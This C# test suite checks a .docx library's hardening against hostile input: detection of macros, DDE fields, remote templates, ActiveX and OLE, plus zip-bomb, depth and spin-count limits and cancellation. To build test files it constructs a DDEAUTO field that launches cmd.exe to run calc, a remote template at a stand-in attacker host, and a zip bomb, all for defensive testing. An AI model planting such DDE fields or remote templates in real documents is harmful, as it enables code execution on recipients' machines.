using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Threading;
using Chuvadi.Docs.Word;
using static Chuvadi.Docs.ManualTests.Program;

namespace Chuvadi.Docs.ManualTests;

/// <summary>
/// Untrusted-input hardening (Anjal Mail asks B1–B3):
/// B1 — macro / active-content detection (detect only, never execute);
/// B2 — zip-bomb, entry-count, nesting-depth and spin-count guards with
///      <see cref="DocxSecurityLimitException"/>;
/// B3 — cancellation of Open / Paragraphs / Tables / ExtractText / Images / Load.
/// Hostile packages are synthesised by mutating a clean docx with System.IO.Compression.
/// </summary>
public static class HardeningTests
{
    private const string W = "http://schemas.openxmlformats.org/wordprocessingml/2006/main";

    public static void Run(string outDir)
    {
        MacroAndActiveContent(outDir);
        ReviewRegressions(outDir);
        ZipBombGuards(outDir);
        NestingDepthGuard(outDir);
        SpinCountGuard(outDir);
        Cancellation(outDir);
    }

    // ---- B1 ------------------------------------------------------------------------

    private static void MacroAndActiveContent(string outDir)
    {
        var clean = BaseDoc(outDir, "hard-clean.docx", withHyperlink: true);

        Check("B1 clean docx: no macros, no active content (hyperlink alone is not active)", () =>
        {
            using var r = DocxReader.Open(clean);
            AssertTrue(!r.HasMacros && !r.ContainsVbaProject && !r.IsMacroEnabledPackage, "macro flags set on a clean file");
            var a = r.GetActiveContent();
            AssertTrue(!a.HasAnyActiveContent, "clean file reported active content");
            AssertTrue(a.ExternalReferences.Count == 1 && a.ExternalReferences[0].IsHyperlink,
                $"expected exactly one hyperlink reference, got {a.ExternalReferences.Count}");
        });

        var docm = Copy(clean, outDir, "hard-macro.docm");
        Mutate(docm, zip =>
        {
            ReplaceText(zip, "[Content_Types].xml", s => s
                .Replace("application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml",
                         "application/vnd.ms-word.document.macroEnabled.main+xml")
                .Replace("</Types>",
                    "<Override PartName=\"/word/vbaProject.bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/></Types>"));
            // Inert bytes standing in for a VBA project: never parsed, never executed.
            AddEntry(zip, "word/vbaProject.bin", Encoding.ASCII.GetBytes("Attribute VB_Name = \"ThisDocument\"\nSub AutoOpen()\nEnd Sub\n"));
            ReplaceText(zip, "word/_rels/document.xml.rels", s => s.Replace("</Relationships>",
                "<Relationship Id=\"rIdVba\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"vbaProject.bin\"/></Relationships>"));
        });

        Check("B1 .docm: HasMacros, ContainsVbaProject, IsMacroEnabledPackage", () =>
        {
            using var r = DocxReader.Open(docm);
            AssertTrue(r.HasMacros, "HasMacros false");
            AssertTrue(r.ContainsVbaProject, "ContainsVbaProject false");
            AssertTrue(r.IsMacroEnabledPackage, "IsMacroEnabledPackage false");
            AssertContains(r.MainPartContentType, "macroEnabled", "MainPartContentType");
            AssertTrue(r.GetActiveContent().HasMacros, "active-content report misses macros");
            AssertContains(r.ExtractText(), "Hardening body", "text still readable");
        });

        var vbaOnly = Copy(clean, outDir, "hard-vba-only.docx");
        Mutate(vbaOnly, zip => AddEntry(zip, "word/vbaProject.bin", new byte[] { 0xCC, 0x61, 0x00, 0x00 }));
        Check("B1 vbaProject.bin smuggled into a .docx content type is still detected", () =>
        {
            using var r = DocxReader.Open(vbaOnly);
            AssertTrue(r.ContainsVbaProject && r.HasMacros && !r.IsMacroEnabledPackage, "smuggled VBA part not flagged");
        });

        var dde = Copy(clean, outDir, "hard-dde.docx");
        Mutate(dde, zip => ReplaceText(zip, "word/document.xml", s => s.Replace("<w:sectPr",
            "<w:p><w:r><w:fldChar w:fldCharType=\"begin\"/></w:r>" +
            "<w:r><w:instrText xml:space=\"preserve\"> DD</w:instrText></w:r>" +
            "<w:r><w:instrText xml:space=\"preserve\">EAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc\" </w:instrText></w:r>" +
            "<w:r><w:fldChar w:fldCharType=\"separate\"/></w:r><w:r><w:t>x</w:t></w:r>" +
            "<w:r><w:fldChar w:fldCharType=\"end\"/></w:r></w:p><w:sectPr")));
        Check("B1 DDEAUTO field split across runs is detected", () =>
        {
            using var r = DocxReader.Open(dde);
            AssertTrue(r.GetActiveContent().HasDdeFields, "DDE field not detected");
        });
        Check("B1 ordinary PAGE field is not reported as DDE", () =>
        {
            AssertTrue(!DocxReaderProbe.IsDde(" PAGE "), "PAGE flagged");
            AssertTrue(DocxReaderProbe.IsDde("\"DDE\" excel"), "quoted DDE missed");
        });

        var remote = Copy(clean, outDir, "hard-remote-template.docx");
        Mutate(remote, zip =>
        {
            AddEntry(zip, "word/_rels/settings.xml.rels", Encoding.UTF8.GetBytes(
                "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>" +
                "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">" +
                "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" " +
                "Target=\"https://attacker.invalid/t.dotm\" TargetMode=\"External\"/></Relationships>"));
            AddEntry(zip, "word/activeX/activeX1.xml", Encoding.UTF8.GetBytes("<ax:ocx xmlns:ax=\"http://schemas.microsoft.com/office/2006/activeX\"/>"));
            AddEntry(zip, "word/embeddings/oleObject1.bin", new byte[] { 1, 2, 3 });
        });
        Check("B1 remote template, ActiveX and OLE embeddings are detected (and never fetched)", () =>
        {
            using var r = DocxReader.Open(remote);
            var a = r.GetActiveContent();
            AssertTrue(a.HasRemoteTemplate, "remote template missed");
            AssertTrue(a.HasExternalResources, "external resource missed");
            AssertTrue(a.HasActiveXControls, "ActiveX missed");
            AssertTrue(a.HasEmbeddedObjects, "embedding missed");
            AssertTrue(a.ExternalReferences.Any(x => x.Target == "https://attacker.invalid/t.dotm" && !x.IsHyperlink),
                "remote template target not listed verbatim");
            AssertTrue(!a.HasMacros, "macros falsely reported");
        });
    }

    // ---- Regressions found in independent review --------------------------------------

    private static void ReviewRegressions(string outDir)
    {
        var clean = BaseDoc(outDir, "hard-rev-base.docx", withHyperlink: false);

        var emptyDrawing = Copy(clean, outDir, "hard-empty-drawing.docx");
        Mutate(emptyDrawing, zip =>
        {
            AddEntry(zip, "word/media/image1.png", ImageTests.SamplePng80x40());
            ReplaceText(zip, "word/_rels/document.xml.rels", s => s.Replace("</Relationships>",
                "<Relationship Id=\"rIdImg\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\" Target=\"media/image1.png\"/></Relationships>"));
            ReplaceText(zip, "word/document.xml", s => s.Replace("<w:sectPr",
                "<w:p><w:r><w:drawing><wp:inline xmlns:wp=\"http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing\"/></w:drawing></w:r></w:p><w:sectPr"));
        });
        Check("empty <wp:inline/> no longer hangs Images() or Document.Load (review #1)", () =>
        {
            var t = System.Threading.Tasks.Task.Run(() =>
            {
                using var r = DocxReader.Open(emptyDrawing);
                var n = r.Images().Count;
                Document.Load(emptyDrawing);
                return n;
            });
            AssertTrue(t.Wait(TimeSpan.FromSeconds(10)), "Images()/Load hung on an empty drawing");
            AssertTrue(t.Result == 0, $"expected 0 images, got {t.Result}");
        });

        var linked = Copy(clean, outDir, "hard-linked-ole.docx");
        Mutate(linked, zip =>
        {
            ReplaceText(zip, "word/_rels/document.xml.rels", s => s.Replace("</Relationships>",
                "<Relationship Id=\"rIdOle\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\" Target=\"file:///\\\\server\\share\\book.xlsx\" TargetMode=\"External\"/></Relationships>"));
            AddEntry(zip, "word/comments.xml", Encoding.UTF8.GetBytes(
                "<w:comments xmlns:w=\"" + W + "\"><w:comment w:id=\"0\"><w:p><w:fldSimple w:instr=\" DDEAUTO cmd /c calc \"><w:r><w:t>x</w:t></w:r></w:fldSimple></w:p></w:comment></w:comments>"));
            ReplaceText(zip, "[Content_Types].xml", s => s.Replace("</Types>",
                "<Override PartName=\"/word/comments.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.wordprocessingml.comments+xml\"/></Types>"));
        });
        Check("linked (external) OLE is an external resource, not an embedded object; DDE in comments found (review #8)", () =>
        {
            using var r = DocxReader.Open(linked);
            var a = r.GetActiveContent();
            AssertTrue(!a.HasEmbeddedObjects, "linked OLE reported as embedded");
            AssertTrue(a.HasExternalResources, "linked OLE not reported as external resource");
            AssertTrue(a.HasDdeFields, "DDE inside comments.xml missed");
        });

        Check("MaxPartBytes breach is DocxSecurityLimitException(PartBytes) everywhere, never swallowed (review #5)", () =>
        {
            var img = Path.Combine(outDir, "hard-partbytes.docx");
            var d = new Document();
            d.AddParagraph("small");
            d.AddImage(ImageSpec.FromBytes(ImageTests.SampleJpeg100x50()));
            d.SaveTo(img);
            var opts = new DocxReaderOptions { MaxPartBytes = 600 };
            using (var r = DocxReader.Open(img, null, opts))
            {
                var ex = Catch<DocxSecurityLimitException>(() => r.Images());
                AssertTrue(ex.Limit == DocxLimit.PartBytes, $"Images: {ex.Limit}");
            }
            var lex = Catch<DocxSecurityLimitException>(() => Document.Load(img, null, opts));
            AssertTrue(lex.Limit == DocxLimit.PartBytes, $"Load: {lex.Limit}");
        });

        Check("MaxPackageBytes bounds the input before buffering, seekable or not (review #6)", () =>
        {
            var opts = new DocxReaderOptions { MaxPackageBytes = 1_000 };
            var ex1 = Catch<DocxSecurityLimitException>(() => DocxReader.Open(clean, null, opts).Dispose());
            AssertTrue(ex1.Limit == DocxLimit.PackageBytes, $"seekable: {ex1.Limit}");
            var ex2 = Catch<DocxSecurityLimitException>(() =>
                DocxReader.Open(new NonSeekable(File.ReadAllBytes(clean)), null, opts).Dispose());
            AssertTrue(ex2.Limit == DocxLimit.PackageBytes, $"non-seekable: {ex2.Limit}");
            using var ok = DocxReader.Open(new NonSeekable(File.ReadAllBytes(clean)));
            AssertContains(ok.ExtractText(), "Hardening body", "non-seekable open");
        });

        Check("Open(stream) owns the stream on every path: disposed with the reader and on failure (review #4)", () =>
        {
            var s1 = new MemoryStream(File.ReadAllBytes(clean));
            DocxReader.Open(s1).Dispose();
            AssertTrue(!s1.CanRead, "not disposed with reader");
            var s2 = new MemoryStream(File.ReadAllBytes(clean));
            Catch<DocxSecurityLimitException>(() => DocxReader.Open(s2, null, new DocxReaderOptions { MaxEntries = 1 }).Dispose());
            AssertTrue(!s2.CanRead, "not disposed after a limit breach");
            var s3 = new NonSeekable(File.ReadAllBytes(clean));
            DocxReader.Open(s3).Dispose();
            AssertTrue(s3.Disposed, "buffered non-seekable input not disposed");
        });
    }

    // ---- B2 ------------------------------------------------------------------------

    private static void ZipBombGuards(string outDir)
    {
        var clean = BaseDoc(outDir, "hard-bomb-base.docx", withHyperlink: false);

        var bomb = Copy(clean, outDir, "hard-bomb.docx");
        Mutate(bomb, zip => AddEntry(zip, "word/bomb.xml", new byte[32 * 1024 * 1024])); // 32 MiB of zeros, ~1000:1
        Check("B2 compression-ratio bomb rejected at Open (explicit 100:1 cap), before inflating", () =>
        {
            var ex = Catch<DocxSecurityLimitException>(() =>
                DocxReader.Open(bomb, null, new DocxReaderOptions { MaxCompressionRatio = 100 }).Dispose());
            AssertTrue(ex.Limit == DocxLimit.CompressionRatio, $"limit was {ex.Limit}");
            AssertTrue(ex.PartName == "word/bomb.xml", $"part was {ex.PartName}");
            AssertTrue(ex.Actual > 100 && ex.Allowed == 100, $"actual {ex.Actual} allowed {ex.Allowed}");
        });
        Check("B2 DocxSecurityLimitException is a DocxFormatException (existing handlers catch it)", () =>
        {
            AssertThrows<DocxFormatException>(() =>
                DocxReader.Open(bomb, null, new DocxReaderOptions { MaxCompressionRatio = 100 }).Dispose(), "base type");
        });
        Check("B2 total-uncompressed cap rejects at Open", () =>
        {
            var ex = Catch<DocxSecurityLimitException>(() =>
                DocxReader.Open(clean, null, new DocxReaderOptions { MaxTotalUncompressedBytes = 1_000 }).Dispose());
            AssertTrue(ex.Limit == DocxLimit.TotalUncompressedBytes, $"limit was {ex.Limit}");
        });
        Check("B2 entry-count cap rejects at Open", () =>
        {
            var ex = Catch<DocxSecurityLimitException>(() =>
                DocxReader.Open(clean, null, new DocxReaderOptions { MaxEntries = 3 }).Dispose());
            AssertTrue(ex.Limit == DocxLimit.EntryCount && ex.Allowed == 3, $"limit was {ex.Limit}");
        });
        Check("B2 Document.Load and DocxTemplate.Fill apply the same guards", () =>
        {
            var lex = Catch<DocxSecurityLimitException>(() =>
                Document.Load(bomb, null, new DocxReaderOptions { MaxCompressionRatio = 100 }));
            AssertTrue(lex.Limit == DocxLimit.CompressionRatio, "Load limit");
            var huge = Copy(clean, outDir, "hard-many-entries.docx");
            Mutate(huge, zip => { for (int i = 0; i < 10_001; i++) AddEntry(zip, $"customXml/x{i}.bin", new byte[] { 1 }); });
            var tex = Catch<DocxSecurityLimitException>(() =>
                DocxTemplate.Fill(huge, Path.Combine(outDir, "hard-many-out.docx"), new System.Collections.Generic.Dictionary<string, string>()));
            AssertTrue(tex.Limit == DocxLimit.EntryCount, "Fill uses default entry cap");
        });
        Check("B2 unrestricted options open the same bomb (limits are opt-out, not hard-coded)", () =>
        {
            using var r = DocxReader.Open(bomb, null, DocxReaderOptions.CreateUnrestricted());
            AssertContains(r.ExtractText(), "Hardening body", "unrestricted read");
        });
        Check("B2 runtime never inflates past an entry's declared size (premise of the pre-scan)", () =>
        {
            var forged = Copy(clean, outDir, "hard-forged-size.docx");
            Mutate(forged, zip => AddEntry(zip, "word/forged.bin", new byte[2_000_000]));
            var bytes = File.ReadAllBytes(forged);
            PatchDeclaredSize(bytes, "word/forged.bin", 1_000);
            File.WriteAllBytes(forged, bytes);
            using var z = new ZipArchive(new MemoryStream(bytes), ZipArchiveMode.Read);
            var e = z.GetEntry("word/forged.bin")!;
            using var s = e.Open();
            long total = 0; var buf = new byte[65536]; int n;
            while ((n = s.Read(buf, 0, buf.Length)) > 0) total += n;
            AssertTrue(e.Length == 1_000 && total <= 1_000, $"declared {e.Length}, inflated {total}");
        });
    }

    private static void NestingDepthGuard(string outDir)
    {
        var clean = BaseDoc(outDir, "hard-depth-base.docx", withHyperlink: false);
        var deep = Copy(clean, outDir, "hard-deep.docx");
        Mutate(deep, zip => ReplaceText(zip, "word/document.xml", s =>
        {
            var open = string.Concat(Enumerable.Repeat("<w:customXml w:element=\"n\">", 400));
            var close = string.Concat(Enumerable.Repeat("</w:customXml>", 400));
            return s.Replace("<w:sectPr", open + "<w:p><w:r><w:t>deep</w:t></w:r></w:p>" + close + "<w:sectPr");
        }));

        Check("B2 nesting depth > 256 rejected while reading (DocxReader)", () =>
        {
            using var r = DocxReader.Open(deep);
            var ex = Catch<DocxSecurityLimitException>(() => r.ExtractText());
            AssertTrue(ex.Limit == DocxLimit.XmlDepth && ex.Allowed == DocxReaderOptions.DefaultMaxXmlDepth, $"limit was {ex.Limit}");
            AssertTrue(ex.PartName == "/word/document.xml", $"part was {ex.PartName}");
        });
        Check("B2 nesting depth guard also applies to Document.Load and DocxTemplate.Fill", () =>
        {
            AssertThrows<DocxSecurityLimitException>(() => Document.Load(deep), "Load");
            AssertThrows<DocxSecurityLimitException>(() =>
                DocxTemplate.Fill(deep, Path.Combine(outDir, "hard-deep-out.docx"), new System.Collections.Generic.Dictionary<string, string>()), "Fill");
        });
        Check("B2 depth limit is configurable (null = unlimited)", () =>
        {
            using var r = DocxReader.Open(deep, null, new DocxReaderOptions { MaxXmlDepth = null });
            AssertContains(r.ExtractText(), "deep", "unlimited depth read");
        });
        Check("B2 DocxTemplate.Fill takes read options (trusted deep template) and a cancellation token (review #7)", () =>
        {
            var outPath = Path.Combine(outDir, "hard-deep-filled.docx");
            DocxTemplate.Fill(deep, outPath, new System.Collections.Generic.Dictionary<string, string>(), null,
                null, null, new DocxReaderOptions { MaxXmlDepth = null });
            AssertTrue(File.Exists(outPath), "no output for trusted deep template");
            using var cts = new CancellationTokenSource();
            cts.Cancel();
            var cancelledOut = Path.Combine(outDir, "hard-cancelled-fill.docx");
            AssertThrows<OperationCanceledException>(() => DocxTemplate.Fill(clean, cancelledOut,
                new System.Collections.Generic.Dictionary<string, string>(), null, null, null, null, cts.Token), "Fill(ct)");
            AssertTrue(!File.Exists(cancelledOut), "cancelled Fill wrote output");
        });
    }

    private static void SpinCountGuard(string outDir)
    {
        var path = Path.Combine(outDir, "hard-spin.docx");
        var doc = new Document();
        doc.AddParagraph("spin guarded");
        doc.SaveTo(path, new EncryptionOptions { Password = "pw", SpinCount = 200_000 });

        Check("B2 spin count above MaxSpinCount rejected BEFORE key derivation", () =>
        {
            var ex = Catch<DocxSecurityLimitException>(() =>
                DocxReader.Open(path, "pw", new DocxReaderOptions { MaxSpinCount = 150_000 }).Dispose());
            AssertTrue(ex.Limit == DocxLimit.SpinCount && ex.Actual == 200_000, $"limit {ex.Limit} actual {ex.Actual}");
            AssertThrows<DocxSecurityLimitException>(() =>
                Document.Load(path, "pw", new DocxReaderOptions { MaxSpinCount = 150_000 }), "Load");
        });
        Check("B2 spin count within the default cap decrypts normally", () =>
        {
            using var r = DocxReader.Open(path, "pw");
            AssertContains(r.ExtractText(), "spin guarded", "decrypted text");
        });
        // The encrypted file is read into memory BEFORE any timing starts: on Windows, antivirus
        // real-time scanning of a freshly written OLE (encrypted) file can hold the first read for
        // ~13 s. That stall is in the OS, outside the library; these checks time the key derivation.
        var slowPath = Path.Combine(outDir, "hard-spin-slow.docx");
        var slowDoc = new Document();
        slowDoc.AddParagraph("slow");
        slowDoc.SaveTo(slowPath, new EncryptionOptions { Password = "pw", SpinCount = 3_000_000 });
        var slowBytes = File.ReadAllBytes(slowPath);

        Check("shared crypto: key derivation observes cancellation within ~1 s, never reported as a wrong password", () =>
        {
            var opts = new DocxReaderOptions { MaxSpinCount = null };
            using var cts = new CancellationTokenSource();
            var sw = new Stopwatch();
            using var timer = new Timer(_ => { sw.Start(); cts.Cancel(); }, null, 150, Timeout.Infinite);
            var total = Stopwatch.StartNew();
            AssertThrows<OperationCanceledException>(() => DocxReader.Open(new MemoryStream(slowBytes), "pw", opts, cts.Token).Dispose(), "Open during KDF");
            sw.Stop();
            AssertTrue(sw.ElapsedMilliseconds < 1_000, $"KDF cancellation latency {sw.ElapsedMilliseconds} ms");
            AssertTrue(total.ElapsedMilliseconds < 5_000, $"Open ran {total.ElapsedMilliseconds} ms before stopping");
        });
        Check("shared crypto: cancellation also stops Document.Load and DocxTemplate.Fill key derivation", () =>
        {
            var slow = slowPath; // already read once above, so the OS no longer holds it
            var opts = new DocxReaderOptions { MaxSpinCount = null };
            using var cts = new CancellationTokenSource(200);
            AssertThrows<OperationCanceledException>(() => Document.Load(new MemoryStream(slowBytes), "pw", opts, cts.Token), "Load during KDF");
            using var cts2 = new CancellationTokenSource(200);
            AssertThrows<OperationCanceledException>(() => DocxTemplate.Fill(slow, Path.Combine(outDir, "hard-spin-fill.docx"),
                new System.Collections.Generic.Dictionary<string, string>(), null, "pw", null, opts, cts2.Token), "Fill during KDF");
        });
    }

    // ---- B3 ------------------------------------------------------------------------

    private static void Cancellation(string outDir)
    {
        var big = Path.Combine(outDir, "hard-big.docx");
        var doc = new Document();
        for (int i = 0; i < 60_000; i++)
            doc.AddParagraph($"Paragraph {i} — a line of ordinary report text to make the part large.");
        var t = doc.AddTable(2);
        t.AddRow("a", "b");
        doc.AddImage(ImageSpec.FromBytes(ImageTests.SamplePng80x40()));
        doc.SaveTo(big);

        Check("B3 pre-cancelled token: Open throws OperationCanceledException", () =>
        {
            using var cts = new CancellationTokenSource();
            cts.Cancel();
            AssertThrows<OperationCanceledException>(() => DocxReader.Open(big, null, null, cts.Token).Dispose(), "Open(path)");
            AssertThrows<OperationCanceledException>(() =>
                DocxReader.Open(new MemoryStream(File.ReadAllBytes(big)), null, null, cts.Token).Dispose(), "Open(stream)");
            AssertThrows<OperationCanceledException>(() => Document.Load(big, null, null, cts.Token), "Document.Load");
        });
        Check("B3 pre-cancelled token: Paragraphs/Tables/ExtractText/Images/GetActiveContent throw", () =>
        {
            using var r = DocxReader.Open(big);
            using var cts = new CancellationTokenSource();
            cts.Cancel();
            AssertThrows<OperationCanceledException>(() => r.Paragraphs(cts.Token).First(), "Paragraphs");
            AssertThrows<OperationCanceledException>(() => r.Tables(cts.Token).First(), "Tables");
            AssertThrows<OperationCanceledException>(() => r.ExtractText(cts.Token), "ExtractText");
            AssertThrows<OperationCanceledException>(() => r.Images(cts.Token), "Images");
            AssertThrows<OperationCanceledException>(() => r.GetActiveContent(cts.Token), "GetActiveContent");
            // The reader stays usable afterwards.
            AssertTrue(r.Paragraphs().First().Text.StartsWith("Paragraph 0", StringComparison.Ordinal), "reader unusable after cancel");
        });
        Check("B3 cancelling mid-enumeration stops Paragraphs(ct) at the next item", () =>
        {
            using var r = DocxReader.Open(big);
            using var cts = new CancellationTokenSource();
            int seen = 0;
            AssertThrows<OperationCanceledException>(() =>
            {
                foreach (var p in r.Paragraphs(cts.Token))
                {
                    if (++seen == 10) cts.Cancel();
                }
            }, "mid-enumeration");
            AssertTrue(seen == 10, $"saw {seen} paragraphs after cancelling at 10");
        });
        Check("B3 cancellation during a long ExtractText takes effect well within 1 s", () =>
        {
            using var r = DocxReader.Open(big);
            using var cts = new CancellationTokenSource();
            var sw = new Stopwatch();
            using var timer = new Timer(_ => { sw.Start(); cts.Cancel(); }, null, 5, Timeout.Infinite);
            bool cancelled = false;
            try
            {
                for (int pass = 0; pass < 1_000; pass++) r.ExtractText(cts.Token); // loop until the timer fires
            }
            catch (OperationCanceledException)
            {
                cancelled = true;
            }
            sw.Stop();
            AssertTrue(cancelled, "ExtractText never observed cancellation");
            AssertTrue(sw.ElapsedMilliseconds < 1_000, $"cancellation latency {sw.ElapsedMilliseconds} ms");
        });
    }

    // ---- Helpers -------------------------------------------------------------------

    private static string BaseDoc(string outDir, string name, bool withHyperlink)
    {
        var path = Path.Combine(outDir, name);
        var doc = new Document();
        doc.AddHeading("Hardening", 1);
        var p = doc.AddParagraph("Hardening body text.");
        if (withHyperlink) p.Text(" See ").Hyperlink("site", "https://example.com/");
        doc.SaveTo(path);
        return path;
    }

    private static string Copy(string src, string outDir, string name)
    {
        var dst = Path.Combine(outDir, name);
        File.Copy(src, dst, overwrite: true);
        return dst;
    }

    private static void Mutate(string path, Action<ZipArchive> mutate)
    {
        using var fs = new FileStream(path, FileMode.Open, FileAccess.ReadWrite);
        using var zip = new ZipArchive(fs, ZipArchiveMode.Update);
        mutate(zip);
    }

    private static void AddEntry(ZipArchive zip, string name, byte[] content)
    {
        zip.GetEntry(name)?.Delete();
        var e = zip.CreateEntry(name, CompressionLevel.Optimal);
        using var s = e.Open();
        s.Write(content, 0, content.Length);
    }

    private static void ReplaceText(ZipArchive zip, string name, Func<string, string> edit)
    {
        var e = zip.GetEntry(name) ?? throw new InvalidOperationException($"missing {name}");
        string text;
        using (var r = new StreamReader(e.Open())) text = r.ReadToEnd();
        AddEntry(zip, name, new UTF8Encoding(false).GetBytes(edit(text)));
    }

    /// <summary>Rewrites one entry's declared uncompressed size in both its local header and central-directory record.</summary>
    private static void PatchDeclaredSize(byte[] zip, string entryName, uint size)
    {
        var nameBytes = Encoding.ASCII.GetBytes(entryName);
        for (int i = 0; i + 46 < zip.Length; i++)
        {
            bool local = zip[i] == 0x50 && zip[i + 1] == 0x4B && zip[i + 2] == 3 && zip[i + 3] == 4;
            bool central = zip[i] == 0x50 && zip[i + 1] == 0x4B && zip[i + 2] == 1 && zip[i + 3] == 2;
            if (!local && !central) continue;
            int nameLenOff = local ? 26 : 28, nameOff = local ? 30 : 46, sizeOff = local ? 22 : 24;
            int nameLen = BitConverter.ToUInt16(zip, i + nameLenOff);
            if (nameLen != nameBytes.Length || i + nameOff + nameLen > zip.Length) continue;
            if (!zip.AsSpan(i + nameOff, nameLen).SequenceEqual(nameBytes)) continue;
            BitConverter.GetBytes(size).CopyTo(zip, i + sizeOff);
        }
    }

    private static T Catch<T>(Action action) where T : Exception
    {
        try
        {
            action();
        }
        catch (T ex)
        {
            return ex;
        }
        throw new InvalidOperationException($"expected {typeof(T).Name}, nothing was thrown.");
    }
}

/// <summary>A read-only, non-seekable stream (like a network or pipe stream) for tests.</summary>
internal sealed class NonSeekable : Stream
{
    private readonly MemoryStream _inner;
    public bool Disposed { get; private set; }
    public NonSeekable(byte[] bytes) => _inner = new MemoryStream(bytes);
    public override bool CanRead => !Disposed;
    public override bool CanSeek => false;
    public override bool CanWrite => false;
    public override long Length => throw new NotSupportedException();
    public override long Position { get => throw new NotSupportedException(); set => throw new NotSupportedException(); }
    public override int Read(byte[] buffer, int offset, int count) => _inner.Read(buffer, offset, count);
    public override void Flush() { }
    public override long Seek(long offset, SeekOrigin origin) => throw new NotSupportedException();
    public override void SetLength(long value) => throw new NotSupportedException();
    public override void Write(byte[] buffer, int offset, int count) => throw new NotSupportedException();
    protected override void Dispose(bool disposing) { Disposed = true; base.Dispose(disposing); }
}

/// <summary>Exposes internal helpers to the harness (InternalsVisibleTo).</summary>
internal static class DocxReaderProbe
{
    public static bool IsDde(string instruction) => DocxReader.IsDdeInstruction(instruction);
}
